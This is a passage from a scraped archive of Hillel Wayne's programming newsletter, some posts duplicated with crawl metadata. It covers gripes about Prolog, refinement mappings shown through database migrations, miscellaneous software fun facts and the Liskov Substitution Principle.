the next release of Logic for Programmers, I'm finally adding the sections on Answer Set Programming and Constraint Logic Programming that I TODOd back in version 0.9. And this is making me re-experience some of my pain points with Prolog, which I will gripe about now. If you want to know more about why Prolog is cool instead, go here or here or here or here. </p>"},{"location":"buttondown.com/hillelwayne/My%20Gripes%20with%20Prolog_20260205/#no-standardized-strings","title":"No standardized strings","text":"<p>ISO \"strings\" are just atoms or lists of single-character atoms (or lists of integer character codes). The various implementations of Prolog add custom string operators but they are not cross compatible, so code written with strings in SWI-Prolog will not work in Scryer Prolog. </p>"},{"location":"buttondown.com/hillelwayne/My%20Gripes%20with%20Prolog_20260205/#no-functions","title":"No functions","text":"<p>Code logic is expressed entirely in rules , predicates which return true or false for certain values. For example if you wanted to get the length of a Prolog list, you write this:</p> <pre><code>?- length([a, b, c], Len).\n\n   Len = 3.\n</code></pre> <p>Now this is pretty cool in that it allows bidirectionality, or running predicates \"in reverse\". To generate lists of length 3, you can write <code>length(L, 3)</code>. But it also means that if you want to get the length a list plus one , you can't do that in one expression, you have to write <code>length(List, Out), X is Out+1</code>.</p> <p>For a while I thought no functions was necessary evil for bidirectionality, but then I discovered Picat has functions and works just fine. That by itself is a reason for me to prefer Picat for my LP needs.</p> <p>(Bidirectionality is a killer feature of Prolog, so it's a shame I so rarely run into situations that use it.)</p>"},{"location":"buttondown.com/hillelwayne/My%20Gripes%20with%20Prolog_20260205/#no-standardized-collection-types-besides-lists","title":"No standardized collection types besides lists","text":"<p>Aside from atoms (<code>abc</code>) and numbers, there are two data types:</p> <ul> <li>Linked lists like <code>[a,b,c,d]</code>.</li> <li> <p>Compound terms like <code>dog(rex, poodle)</code>, which seem like record types but are actually tuples. You can even convert compound terms to linked lists with <code>=..</code>:</p> <p>?- L =.. [a, b, c].    L = a(b, c). ?- a(b, c(c)) =.. L.    L = [a, b, c(c)].</p> </li> </ul> <p>There's no proper key-value maps or even struct types. Again, this is something that individual distributions can fix (without cross compatibility), but these never feel integrated with the rest of the language. </p>"},{"location":"buttondown.com/hillelwayne/My%20Gripes%20with%20Prolog_20260205/#no-boolean-values","title":"No boolean values","text":"<p><code>true</code> and <code>false</code> aren't values, they're control flow statements. <code>true</code> is a noop and <code>false</code> says that the current search path is a dead end, so backtrack and start again. You can't explicitly store true and false as values, you have to implicitly have them in facts (<code>passed(test)</code> instead of <code>test.passed? == true</code>).</p> <p>This hasn't made any tasks impossible, and I can usually find a workaround to whatever I want to do. But I do think it makes things more inconvenient! Sometimes I want to do something dumb like \"get all atoms that don't pass at least three of these rules\", and that'd be a lot easier if I could shove intermediate results into a sack of booleans. </p> <p>(This is called \"Negation as Failure\". I think this might be necessary to make Prolog a Turing complete general programming language. Picat fixes a lot of Prolog's gripes and still has negation as failure. ASP has regular negation but it's not Turing complete.) </p>"},{"location":"buttondown.com/hillelwayne/My%20Gripes%20with%20Prolog_20260205/#cuts-are-confusing","title":"Cuts are confusing","text":"<p>Prolog finds solutions through depth first search, and a \"cut\" (<code>!</code>) symbol prevents backtracking past a certain point. This is necessary for optimization but can lead to invalid programs. </p> <p>You're not supposed to use cuts if you can avoid it, so I pretended cuts didn't exist. Which is why I was surprised to find that conditionals are implemented with cuts. Because cuts are spooky dark magic conditionals sometimes conditionals work as I expect them to and sometimes leave out valid solutions and I have no idea how to tell which it'll be. Usually I find it safer to just avoid conditionals entirely, which means my code gets a lot longer and messier. </p>"},{"location":"buttondown.com/hillelwayne/My%20Gripes%20with%20Prolog_20260205/#non-cuts-are-confusing","title":"Non-cuts are confusing","text":"<p>The original example in the last section was this: </p> <pre><code>foo(A, B) :-\n    \\+ (A = B),\n    A = 1,\n    B = 2.\n</code></pre> <p><code>foo(1, 2)</code> returns true, so you'd expect <code>f(A, B)</code> to return <code>A=1, B=2</code>. But it returns <code>false</code>. Whereas this works as expected.</p> <pre><code>bar(A, B) :-\n    A = 1,\n    B = 2,\n    \\+ (A = B).\n</code></pre> <p>I thought this was because <code>\\+</code> was implemented with cuts, and the Clocksin book suggests it's <code>call(P), !, fail</code>, so this was my prime example about how cuts are confusing. But then I tried this:</p> <pre><code>?- member(A, [1,2,3]), \\+ (A = 2), A = 3.\nA = 3. % wtf?\n</code></pre> <p>There's no way to get that behavior with cuts! I don't think <code>\\+</code> uses cuts at all! And now I have to figure out why <code>foo(A, B)</code> doesn't returns results. Is it floundering? Is it because <code>\\+ P</code> only succeeds if <code>P</code> fails, and <code>A = B</code> always succeeds? A closed-world assumption? Something else?1</p>"},{"location":"buttondown.com/hillelwayne/My%20Gripes%20with%20Prolog_20260205/#straying-outside-of-default-queries-is-confusing","title":"Straying outside of default queries is confusing","text":"<p>Say I have a program like this:</p> <pre><code>tree(n, n1).\ntree(n, n2).\ntree(n1, n11).\ntree(n2, n21).\ntree(n2, n22).\ntree(n11, n111).\ntree(n11, n112).\n\nbranch(N) :- % two children\n    tree(N, C1),\n    tree(N, C2),\n    C1 @&lt; C2. % ordering\n</code></pre> <p>And I want to know all of the nodes that are parents of branches. The normal way to do this is with a query:</p> <pre><code>?- tree(A, N), branch(N).\nA = n, N = n2; % show more...\nA = n1, N = n11.\n</code></pre> <p>This is interactively making me query for every result. That's usually not what I want, I know the result of my query is finite and I want all of the results at once, so I can count or farble or whatever them. It took a while to figure out that the proper solution is <code>bagof(Template, Goal, Bag)</code>, which will \"Unify Bag with the alternatives of Template\":</p> <pre><code>?- bagof(A, (tree(A, N), branch(N)), As).\n\nAs = [n1], N = n11;\nAs = [n], N = n2.\n</code></pre> <p>Wait crap that's still giving one result at a time, because <code>N</code> is a free variable in <code>bagof</code> so it backtracks over that. It surprises me but I guess it's good to have as an option. So how do I get all of the results at once?</p> <pre><code>?- bagof(A, N^(tree(A, N), branch(N)), As).\n\nAs = [n, n1]\n</code></pre> <p>The only difference is the <code>N^Goal</code>, which tells <code>bagof</code> to ignore and group the results of <code>N</code>. As far as I can tell, this is the only place the ISO standard uses <code>^</code> to mean anything besides exponentiation. Supposedly it's the existential quantifier? In general whenever I try to stray outside simpler use-cases, especially if I try to do things non-interactively, I run into trouble.</p>"},{"location":"buttondown.com/hillelwayne/My%20Gripes%20with%20Prolog_20260205/#i-have-mixed-feelings-about-symbol-terms","title":"I have mixed feelings about symbol terms","text":"<p>It took me a long time to realize the reason <code>bagof</code> \"works\" is because infix symbols are mapped to prefix compound terms, so that <code>a^b</code> is <code>^(a, b)</code>, and then different predicates can decide to do different things with <code>^(a, b)</code>.</p> <p>This is also why you can't just write <code>A = B+1</code>: that unifies <code>A</code> with the compound term <code>+(B, 1)</code>. <code>A+1 = B+2</code> is false , as <code>1 \\= 2</code>. You have to write <code>A+1 is B+2</code>, as <code>is</code> is the operator that converts <code>+(B, 1)</code> to a mathematical term.</p> <p>(And that fails because <code>is</code> isn't fully bidirectional. The lhs must be a single variable. You have to import <code>clpfd</code> and write <code>A + 1 #= B + 2</code>.)</p> <p>I don't like this, but I'm a hypocrite for saying that because I appreciate the idea and don't mind custom symbols in other languages. I guess what annoys me is there's no official definition of what <code>^(a, b)</code> is, it's purely a convention. ISO Prolog uses <code>-(a, b)</code> (aka <code>a-b</code>) as a convention to mean \"pairs\", and the only way to realize that is to see that an awful lot of standard modules use that convention. But you can use <code>-(a, b)</code> to mean something else in your own code and nothing will warn you of the inconsistency.</p> <p>Anyway I griped about pairs so I can gripe about <code>sort</code>.</p>"},{"location":"buttondown.com/hillelwayne/My%20Gripes%20with%20Prolog_20260205/#go-home-sort-ur-drunk","title":"go home sort, ur drunk","text":"<p>This one's just a blunder:</p> <pre><code>?- sort([3,1,2,1,3], Out).\n   Out = [1, 2, 3]. % wat\n</code></pre> <p>According to an expert online this is because sort is supposed to return a sorted set , not a sorted list. If you want to preserve duplicates you're supposed to lift all of the values into <code>-($key, $value)</code> compound terms, then use keysort, then extract the values. And, since there's no functions, this process takes at least three lines. This is also how you're supposed to sort by a custom predicate, like \"the second value of a compound term\". </p> <p>(Most (but not all) distributions have a duplicate merge like msort. SWI-Prolog also has a sort by key but it removes duplicates.)</p>"},{"location":"buttondown.com/hillelwayne/My%20Gripes%20with%20Prolog_20260205/#please-just-let-me-end-rules-with-a-trailing-comma-instead-of-a-period-im-begging-you","title":"Please just let me end rules with a trailing comma instead of a period, I'm begging you","text":"<p>I don't care if it makes fact parsing ambiguous, I just don't want \"reorder two lines\" to be a syntax error anymore</p> <p>I expect by this time tomorrow I'll have been Cunningham'd and there will be a 2000 word essay about how all of my gripes are either easily fixable by doing XYZ or how they are the best possible choice that Prolog could have made. I mean, even in writing this I found out some fixes to problems I had. Like I was going to gripe about how I can't run SWI-Prolog queries from the command line but, in doing do diligence finally finally figured it out:</p> <pre><code>swipl -t halt -g \"bagof(X, Goal, Xs), print(Xs)\" ./file.pl\n</code></pre> <p>It's pretty clunky but still better than the old process of having to enter an interactive session every time I wanted to validate a script change.</p> <p>(Also, answer set programming is pretty darn cool. Excited to write about it in the book!)</p> <ol> <li>A couple of people mentioned using dif/2 instead of <code>\\+ A = B</code>. Dif is great but usually I hit the negation footgun with things like <code>\\+ foo(A, B), bar(B, C), baz(A, C)</code>, where <code>dif/2</code> isn't applicable. \u21a9</li> </ol>"},{"location":"buttondown.com/hillelwayne/Refinement%20without%20Specification_20260120/","title":"Refinement without Specification","text":"<p>\u6765\u6e90: buttondown.com/hillelwayne \u53d1\u5e03\u65f6\u95f4: Tue, 20 Jan 2026 17:49:07 +0000 \u94fe\u63a5: https://buttondown.com/hillelwayne/archive/refinement-without-specification/</p> <p>Imagine we have a SQL database with a user table, and users have a non-nullable is_activated boolean column. Having read That Boolean Should Probably Be Something else , you decide to migrate it to a nullable activated_at column. You can change any of the SQL queries that read/update the user table but not any of the code that uses the results of these queries. Can we make this change in a way that preserves all external properties? Yes. If an update would set is_activated to true, instead set it to the current date. Now define the refinement mapping that takes a new_user and returns an old_user . All columns will be unchanged except is_activated , which will be f(new_user).is_activated =      if new_user.activated_at == NULL      then FALSE     else TRUE Now new code can use new_user directly while legacy code can use f(new_user) instead, which will behave indistinguishably from the old_user . A little more time passes and you decide to switch to an event sourcing -like model. So instead of an activated_at column, you have a user_events table, where every record is (user_id, timestamp, event) . So adding an activate event will activate the user, adding a deactivate event will deactivate the user. Once again, we can update the queries but not any of the code that uses the results of these queries. Can we make a change that preserves all external properties? Yes. If an update would change is_activated , instead have it add an appropriate record to the event table. Now, define the refinement mapping that takes newer_user and returns new_user . The activated_at field will be computed like this: g(newer_user).activated_at =         # last_activated_event     let lae =              newer_user.events                       .filter(event = \"activate\" | \"deactivate\")                       .last,     in         if lae.event == \"activate\"          then lae.timestamp         else NULL Now new code can use newer_user directly while old code can use g(newer_user) and the really old code can use f(g(newer_user)) . Mutability constraints I said \"these preserve all external properties\" and that was a lie. It depends on the properties we explicitly have, and I didn't list any. The real interesting properties for me are mutability constraints on how the system can evolve. So let's go back in time and add a constraint to user : C1(u) = u.is_activated =&gt; u.is_activated' This constraint means that if a user is activated, any change will preserve its activated-ness. This means a user can go from deactivated to activated but not the other way. It's not a particular good constraint but it's good enough for teaching purposes. Such a SQL constraint can be enforced with triggers . Now we can throw a constraint on new_user : C2(nu) = nu.activated_at != NULL =&gt; nu.activated_at' != NULL If nu satisfies C2 , then f(nu) satisfies C1 . So the refinement still holds. With newer_u , we cannot guarantee that g(newer_u) satisfies C2 because we can go from \"activated\" to \"deactivated\" just by appending a new event. So it's not a refinement. This is fixable by removing deactivation events, that would work too. So a more interesting case is bad_user , a refinement of user that has both activated_at and activated_until . We propose the refinement mapping b : b(bad_user).activated =     if bad_user.activated_at == NULL &amp;&amp; activated_until == NULL     then FALSE     else bad_user.activated_at &lt;= now() &lt; bad_user.activated_until But now if enough time passes, b(bad_user).activated' = false , so this is not a refinement either. The punchline Refinement is one of the most powerful techniques in formal specification, but also one of the hardest for people to understand. I'm starting to think that the reason it's so hard is because they learn refinement while they're also learning formal methods, so are faced with an unfamiliar topic in an unfamiliar context. If that's the case, then maybe it's easier introducing refinement in a more common context like databases. I've written a bit about refinement in the normal context here (showing one specification is an implementation of another). I kinda want to work this explanation into the book but it might be too late for big content additions like this. (Food for thought: how do refinement mappings relate to database views?)</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 13:04:44</p>"},{"location":"buttondown.com/hillelwayne/Refinement%20without%20Specification_20260205/","title":"Refinement without Specification","text":"<p>\u6765\u6e90: https://buttondown.com/hillelwayne \u94fe\u63a5: https://buttondown.com/hillelwayne/archive/refinement-without-specification/ \u65e5\u671f: Tue, 20 Jan 2026 17:49:07 +0000</p> <p>Imagine we have a SQL database with a <code>user</code> table, and users have a non-nullable <code>is_activated</code> boolean column. Having read That Boolean Should Probably Be Something else, you decide to migrate it to a nullable <code>activated_at</code> column. You can change any of the SQL queries that read/update the <code>user</code> table but not any of the code that uses the results of these queries. Can we make this change in a way that preserves all external properties? </p> <p>Yes. If an update would set <code>is_activated</code> to true, instead set it to the current date. Now define the refinement mapping that takes a <code>new_user</code> and returns an <code>old_user</code>. All columns will be unchanged except <code>is_activated</code>, which will be</p> <pre><code>f(new_user).is_activated = \n    if new_user.activated_at == NULL \n    then FALSE\n    else TRUE\n</code></pre> <p>Now new code can use <code>new_user</code> directly while legacy code can use <code>f(new_user)</code> instead, which will behave indistinguishably from the <code>old_user</code>. </p> <p>A little more time passes and you decide to switch to an event sourcing-like model. So instead of an <code>activated_at</code> column, you have a <code>user_events</code> table, where every record is <code>(user_id, timestamp, event)</code>. So adding an <code>activate</code> event will activate the user, adding a <code>deactivate</code> event will deactivate the user. Once again, we can update the queries but not any of the code that uses the results of these queries. Can we make a change that preserves all external properties?</p> <p>Yes. If an update would change <code>is_activated</code>, instead have it add an appropriate record to the event table. Now, define the refinement mapping that takes <code>newer_user</code> and returns <code>new_user</code>. The <code>activated_at</code> field will be computed like this:</p> <pre><code>g(newer_user).activated_at =\n        # last_activated_event\n    let lae = \n            newer_user.events\n                      .filter(event = \"activate\" | \"deactivate\")\n                      .last,\n    in\n        if lae.event == \"activate\" \n        then lae.timestamp\n        else NULL\n</code></pre> <p>Now new code can use <code>newer_user</code> directly while old code can use <code>g(newer_user)</code> and the really old code can use <code>f(g(newer_user))</code>.</p>"},{"location":"buttondown.com/hillelwayne/Refinement%20without%20Specification_20260205/#mutability-constraints","title":"Mutability constraints","text":"<p>I said \"these preserve all external properties\" and that was a lie. It depends on the properties we explicitly have, and I didn't list any. The real interesting properties for me are mutability constraints on how the system can evolve. So let's go back in time and add a constraint to <code>user</code>:</p> <pre><code>C1(u) = u.is_activated =&gt; u.is_activated'\n</code></pre> <p>This constraint means that if a user is activated, any change will preserve its activated-ness. This means a user can go from deactivated to activated but not the other way. It's not a particular good constraint but it's good enough for teaching purposes. Such a SQL constraint can be enforced with triggers. </p> <p>Now we can throw a constraint on <code>new_user</code>:</p> <pre><code>C2(nu) = nu.activated_at != NULL =&gt; nu.activated_at' != NULL\n</code></pre> <p>If <code>nu</code> satisfies <code>C2</code>, then <code>f(nu)</code> satisfies <code>C1</code>. So the refinement still holds.</p> <p>With <code>newer_u</code>, we cannot guarantee that <code>g(newer_u)</code> satisfies <code>C2</code> because we can go from \"activated\" to \"deactivated\" just by appending a new event. So it's not a refinement. This is fixable by removing deactivation events, that would work too.</p> <p>So a more interesting case is <code>bad_user</code>, a refinement of <code>user</code> that has both <code>activated_at</code> and <code>activated_until</code>. We propose the refinement mapping <code>b</code>:</p> <pre><code>b(bad_user).activated =\n    if bad_user.activated_at == NULL &amp;&amp; activated_until == NULL\n    then FALSE\n    else bad_user.activated_at &lt;= now() &lt; bad_user.activated_until\n</code></pre> <p>But now if enough time passes, <code>b(bad_user).activated' = false</code>, so this is not a refinement either.</p>"},{"location":"buttondown.com/hillelwayne/Refinement%20without%20Specification_20260205/#the-punchline","title":"The punchline","text":"<p>Refinement is one of the most powerful techniques in formal specification, but also one of the hardest for people to understand. I'm starting to think that the reason it's so hard is because they learn refinement while they're also learning formal methods, so are faced with an unfamiliar topic in an unfamiliar context. If that's the case, then maybe it's easier introducing refinement in a more common context like databases.</p> <p>I've written a bit about refinement in the normal context here (showing one specification is an implementation of another). I kinda want to work this explanation into the book but it might be too late for big content additions like this.</p> <p>(Food for thought: how do refinement mappings relate to database views?)</p>"},{"location":"buttondown.com/hillelwayne/Some%20Fun%20Software%20Facts_20251210/","title":"Some Fun Software Facts","text":"<p>\u6765\u6e90: buttondown.com/hillelwayne \u53d1\u5e03\u65f6\u95f4: Wed, 10 Dec 2025 18:45:37 +0000 \u94fe\u63a5: https://buttondown.com/hillelwayne/archive/some-fun-software-facts/</p> <p>Last newsletter of the year! First some news on Logic for Programmers . Thanks to everyone who donated to the feedchicago charity drive ! In total we raised $2250 for Chicago food banks. Proof here . If you missed buying Logic for Programmers real cheap in the charity drive, you can still get it for $10 off with the holiday code hannukah-presents . This will last from now until the end of the year. After that, I'll be raising the price from $25 to $30. Anyway, to make this more than just some record keeping, let's close out with something light. I'm one of those people who loves hearing \"fun facts\" about stuff. So here's some random fun facts I accumulated about software over the years: In 2017, a team of eight+ programmers successfully implemented Tetris as a game of life simulation . The GoL grid had an area of 30 trillion pixels and implemented a full programmable CPU as part of the project. Computer systems have to deal with leap seconds in order to keep UTC (where one day is 86,400 seconds) in sync with UT1 (where one day is exactly one full earth rotation). The people in charge recently passed a resolution to abolish the leap second by 2035, letting UTC and UT1 slowly drift out of sync. Vim is Turing complete . The backslash character basically didn't exist in writing before 1930, and was only added to ASCII so mathematicians (and ALGOLists) could write /\\ and \\/ . It's popular use in computing stems entirely from being a useless key on the keyboard. Galactic Algorithms are algorithms that are theoretically faster than algorithms we use, but only at scales that make them impractical. For example, matrix multiplication of NxN is normally O(N^2.81). The Coppersmith Winograd algorithm is O(N^2.38), but is so complex that it's vastly slower for even 10,000 x 10,000 matrices . It's still interesting in advancing our mathematical understanding of algorithms! Cloudflare generates random numbers by, in part, taking pictures of 100 lava lamps . Mergesort is older than bubblesort. Quicksort is slightly younger than bubblesort but older than the term \"bubblesort\". Bubblesort, btw, does have some uses . Speaking of mergesort, most implementations of mergesort pre-2006 were broken . Basically the problem was that the \"find the midpoint of a list\" step could overflow if the list was big enough. For C with 32-bit signed integers, \"big enough\" meant over a billion elements, which was why the bug went unnoticed for so long. PDF's drawing model cannot render perfect circles . People make fun of how you have to flip USBs three times to get them into a computer, but there's supposed to be a guide: according to the standard, USBs are supposed to be inserted logo-side up . Of course, this assumes that the port is right-side up, too, which is why USB-C is just symmetric. I was gonna write a fun fact about how all spreadsheet software treats 1900 as a leap year, as that was a bug in Lotus 1-2-3 and everybody preserved backwards compatibility. But I checked and Google sheets considers it a normal year. So I guess the fun fact is that things have changed! Speaking of spreadsheet errors, in 2020 biologists changed the official nomenclature of 27 genes because Excel kept parsing their names as dates. F.ex MARCH1 was renamed to MARCHF1 to avoid being parsed as \"March 1st\". Microsoft rolled out a fix for this... three years later. It is possible to encode any valid JavaScript program with just the characters ()+[]! . This encoding is called JSFuck and was once used to distribute malware on Ebay . Happy holidays everyone, and see you in 2026! Current status update: I'm finally getting line by line structural editing done and it's turning up lots of improvements, so I'm doing more rewrites than I expected to be doing. \u21a9</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 13:04:48</p>"},{"location":"buttondown.com/hillelwayne/Some%20Fun%20Software%20Facts_20260205/","title":"Some Fun Software Facts","text":"<p>\u6765\u6e90: https://buttondown.com/hillelwayne \u94fe\u63a5: https://buttondown.com/hillelwayne/archive/some-fun-software-facts/ \u65e5\u671f: Wed, 10 Dec 2025 18:45:37 +0000</p> <p>Last newsletter of the year!</p> <p>First some news on Logic for Programmers. Thanks to everyone who donated to the feedchicago charity drive! In total we raised $2250 for Chicago food banks. Proof here.</p> <p>If you missed buying Logic for Programmers real cheap in the charity drive, you can still get it for $10 off with the holiday code hannukah-presents. This will last from now until the end of the year. After that, I'll be raising the price from $25 to $30.</p> <p>Anyway, to make this more than just some record keeping, let's close out with something light. I'm one of those people who loves hearing \"fun facts\" about stuff. So here's some random fun facts I accumulated about software over the years:</p> <ul> <li> <p>In 2017, a team of eight+ programmers successfully implemented Tetris as a game of life simulation. The GoL grid had an area of 30 trillion pixels and implemented a full programmable CPU as part of the project.</p> </li> <li> <p>Computer systems have to deal with leap seconds in order to keep UTC (where one day is 86,400 seconds) in sync with UT1 (where one day is exactly one full earth rotation). The people in charge recently passed a resolution to abolish the leap second by 2035, letting UTC and UT1 slowly drift out of sync.</p> </li> <li> <p>Vim is Turing complete.</p> </li> <li> <p>The backslash character basically didn't exist in writing before 1930, and was only added to ASCII so mathematicians (and ALGOLists) could write <code>/\\</code> and <code>\\/</code>. It's popular use in computing stems entirely from being a useless key on the keyboard.</p> </li> <li> <p>Galactic Algorithms are algorithms that are theoretically faster than algorithms we use, but only at scales that make them impractical. For example, matrix multiplication of NxN is normally O(N^2.81). The Coppersmith Winograd algorithm is O(N^2.38), but is so complex that it's vastly slower for even 10,000 x 10,000 matrices. It's still interesting in advancing our mathematical understanding of algorithms!</p> </li> <li> <p>Cloudflare generates random numbers by, in part, taking pictures of 100 lava lamps.</p> </li> <li> <p>Mergesort is older than bubblesort. Quicksort is slightly younger than bubblesort but older than the term \"bubblesort\". Bubblesort, btw, does have some uses.</p> </li> <li> <p>Speaking of mergesort, most implementations of mergesort pre-2006 were broken. Basically the problem was that the \"find the midpoint of a list\" step could overflow if the list was big enough. For C with 32-bit signed integers, \"big enough\" meant over a billion elements, which was why the bug went unnoticed for so long.</p> </li> <li> <p>PDF's drawing model cannot render perfect circles.</p> </li> <li> <p>People make fun of how you have to flip USBs three times to get them into a computer, but there's supposed to be a guide: according to the standard, USBs are supposed to be inserted logo-side up. Of course, this assumes that the port is right-side up, too, which is why USB-C is just symmetric. </p> </li> <li> <p>I was gonna write a fun fact about how all spreadsheet software treats 1900 as a leap year, as that was a bug in Lotus 1-2-3 and everybody preserved backwards compatibility. But I checked and Google sheets considers it a normal year. So I guess the fun fact is that things have changed!</p> </li> <li> <p>Speaking of spreadsheet errors, in 2020 biologists changed the official nomenclature of 27 genes because Excel kept parsing their names as dates. F.ex MARCH1 was renamed to MARCHF1 to avoid being parsed as \"March 1st\". Microsoft rolled out a fix for this... three years later.</p> </li> <li> <p>It is possible to encode any valid JavaScript program with just the characters <code>()+[]!</code>. This encoding is called JSFuck and was once used to distribute malware on Ebay.</p> </li> </ul> <p>Happy holidays everyone, and see you in 2026!</p> <ol> <li>Current status update: I'm finally getting line by line structural editing done and it's turning up lots of improvements, so I'm doing more rewrites than I expected to be doing. \u21a9</li> </ol>"},{"location":"buttondown.com/hillelwayne/The%20Liskov%20Substitution%20Principle%20does%20more%20than%20you%20think_20260106/","title":"The Liskov Substitution Principle does more than you think","text":"<p>\u6765\u6e90: buttondown.com/hillelwayne \u53d1\u5e03\u65f6\u95f4: Tue, 06 Jan 2026 16:51:26 +0000 \u94fe\u63a5: https://buttondown.com/hillelwayne/archive/the-liskov-substitution-principle-does-more-than/</p> <p>Happy New Year! I'm done with the newsletter hiatus and am going to try updating weekly again. To ease into things a bit, I'll try to keep posts a little more off the cuff and casual for a while, at least until Logic for Programmers is done. Speaking of which, v0.13 should be out by the end of this month. So for this newsletter I want to talk about the Liskov Substitution Principle (LSP). Last week I read A SOLID Load of Bull by cryptographer Loupe Vaillant, where he argues the SOLID principles of OOP are not worth following. He makes an exception for LSP, but also claims that it's \"just subtyping\" and further: If I were trying really hard to be negative about the Liskov substitution principle, I would stress that it only applies when inheritance is involved , and inheritance is strongly discouraged anyway. LSP is more interesting than that! In the original paper, A Behavioral Notion of Subtyping , Barbara Liskov and Jeannette Wing start by defining a \"correct\" subtyping as follows: Subtype Requirement: Let \u03d5(x) be a property provable about objects x of type T. Then \u03d5(y) should be true for objects y of type S where S is a subtype of T. From then on, the paper determine what guarantees that a subtype is correct. 1 They identify three conditions: Each of the subtype's methods has the same or weaker preconditions and the same or stronger postconditions as the corresponding supertype method. 2 The subtype satisfies all state invariants of the supertype. The subtype satisfies all \"history properties\" of the supertype. 3 e.g. if a supertype has an immutable field, the subtype cannot make it mutable. (Later, Elisa Baniassad and Alexander Summers would realize these are equivalent to \"the subtype passes all black-box tests designed for the supertype\", which I wrote a little bit more about here .) I want to focus on the first rule about preconditions and postconditions. This refers to the method's contract .  For a function f , f.Pre is what must be true going into the function, and f.Post is what the function guarantees on execution. A canonical example is square root: sqrt.Pre(x) = x &gt;= 0 sqrt.Post(x, out) = out &gt;= 0 &amp;&amp; out*out == x Mathematically we would write this as all x: f.Pre(x) =&gt; f.Post(x) (where =&gt; is the implication operator ). If that relation holds for all x , we say the function is \"correct\". With this definition we can actually formally deduce the first  subtyping requirement. Let caller be some code that uses a method, which we will call super , and let both caller and super be correct. Then we know the following statements are true: 1. caller.Pre &amp;&amp; stuff =&gt; super.Pre   2. super.Pre =&gt; super.Post   3. super.Post &amp;&amp; more_stuff =&gt; caller.Post Now let's say we substitute super with sub , which is also correct. Here is what we now know is true: 1. caller.Pre =&gt; super.Pre - 2. super.Pre =&gt; super.Post + 2. sub.Pre =&gt; sub.Post 3. super.Post =&gt; caller.Post When is caller still correct? When we can fill in the \"gaps\" in the chain, aka if super.Pre =&gt; sub.Pre and sub.Post =&gt; super.Post . In other words, if sub 's preconditions are weaker than (or equivalent to) super 's preconditions and if sub 's postconditions are stronger than (or equivalent to) super 's postconditions. Notice that I never actually said sub was from a subtype of super ! The LSP conditions (at least, the contract rule of LSP) doesn't just apply to subtypes but can be applied in any situation where we substitute a function or block of code for another. Subtyping is a common place where this happens, but by no means the only! We can also substitute across time.Any time we modify some code's behavior, we are effectively substituting the new version in for the old version, and so the new version's contract must be compatible with the old version's to guarantee no existing code is broken. For example, say we maintain an API or function with two required inputs, X and Y , and one optional input, Z . Making Z required strengthens the precondition (\"input must have Z\" is stronger than \"input may have Z\"), so potentially breaks existing users of our API. Making Y optional weakens the precondition (\"input may have Y\" is weaker than \"input must have Y\"), so is guaranteed to be compatible. (This also underpins The robustness principle : \"be conservative in what you send, be liberal in what you accept\".) Now the dark side of all this is Hyrum's Law . In the below code, are new 's postconditions stronger than old 's postconditions? def old (): return { \"a\" : \"foo\" , \"b\" : \"bar\" } def new (): return { \"a\" : \"foo\" , \"b\" : \"bar\" , \"c\" : \"baz\" } On a first appearance, this is a strengthened postcondition: out.contains_keys([a, b, c]) =&gt; out.contains_keys([a, b]) . But now someone does this: my_dict = { \"c\" : \"blat\" } my_dict |= new () assert my_dict [ c ] == \"blat\" Oh no, their code now breaks! They saw old had the postcondition \" out does NOT contain \"c\" as a key\", and then wrote their code expecting that postcondition. In a sense, any change the postcondition can potentially break someone . \"All observable behaviors of your system will be depended on by somebody\", as Hyrum's Law puts it. So we need to be explicit in what our postconditions actually are, and properties of the output that are not part of our explicit postconditions are subject to be violated on the next version. You'll break people's workflows but you also have grounds to say \"I warned you\". Overall, Liskov and Wing did their work in the context of subtyping, but the principles are more widely applicable, certainly to more than just the use of inheritance. Though they restrict it to just safety properties . \u21a9 The paper lists a couple of other authors as introduce the idea of \"contra/covariance rules\", but part of being \"off-the-cuff and casual\" means not diving into every referenced paper. So they might have gotten the pre/postconditions thing from an earlier author, dunno for sure! \u21a9 I believe that this is equivalent to the formal methods notion of a refinement . \u21a9</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 13:04:47</p>"},{"location":"buttondown.com/hillelwayne/The%20Liskov%20Substitution%20Principle%20does%20more%20than%20you%20think_20260205/","title":"The Liskov Substitution Principle does more than you think","text":"<p>\u6765\u6e90: https://buttondown.com/hillelwayne \u94fe\u63a5: https://buttondown.com/hillelwayne/archive/the-liskov-substitution-principle-does-more-than/ \u65e5\u671f: Tue, 06 Jan 2026 16:51:26 +0000</p> <p>Happy New Year! I'm done with the newsletter hiatus and am going to try updating weekly again. To ease into things a bit, I'll try to keep posts a little more off the cuff and casual for a while, at least until Logic for Programmers is done. Speaking of which, v0.13 should be out by the end of this month.</p> <p>So for this newsletter I want to talk about the Liskov Substitution Principle (LSP). Last week I read A SOLID Load of Bull by cryptographer Loupe Vaillant, where he argues the SOLID principles of OOP are not worth following. He makes an exception for LSP, but also claims that it's \"just subtyping\" and further:</p> <p>If I were trying really hard to be negative about the Liskov substitution principle, I would stress that it only applies when inheritance is involved , and inheritance is strongly discouraged anyway.</p> <p>LSP is more interesting than that! In the original paper, A Behavioral Notion of Subtyping, Barbara Liskov and Jeannette Wing start by defining a \"correct\" subtyping as follows:</p> <p>Subtype Requirement: Let \u03d5(x) be a property provable about objects x of type T. Then \u03d5(y) should be true for objects y of type S where S is a subtype of T.</p> <p>From then on, the paper determine what guarantees that a subtype is correct.1 They identify three conditions: </p> <ol> <li>Each of the subtype's methods has the same or weaker preconditions and the same or stronger postconditions as the corresponding supertype method.2</li> <li>The subtype satisfies all state invariants of the supertype. </li> <li>The subtype satisfies all \"history properties\" of the supertype. 3 e.g. if a supertype has an immutable field, the subtype cannot make it mutable. </li> </ol> <p>(Later, Elisa Baniassad and Alexander Summers would realize these are equivalent to \"the subtype passes all black-box tests designed for the supertype\", which I wrote a little bit more about here.)</p> <p>I want to focus on the first rule about preconditions and postconditions. This refers to the method's contract. For a function <code>f</code>, <code>f.Pre</code> is what must be true going into the function, and <code>f.Post</code> is what the function guarantees on execution. A canonical example is square root: </p> <pre><code>sqrt.Pre(x) = x &gt;= 0\nsqrt.Post(x, out) = out &gt;= 0 &amp;&amp; out*out == x\n</code></pre> <p>Mathematically we would write this as <code>all x: f.Pre(x) =&gt; f.Post(x)</code> (where <code>=&gt;</code> is the implication operator). If that relation holds for all <code>x</code>, we say the function is \"correct\". With this definition we can actually formally deduce the first subtyping requirement. Let <code>caller</code> be some code that uses a method, which we will call <code>super</code>, and let both <code>caller</code> and <code>super</code> be 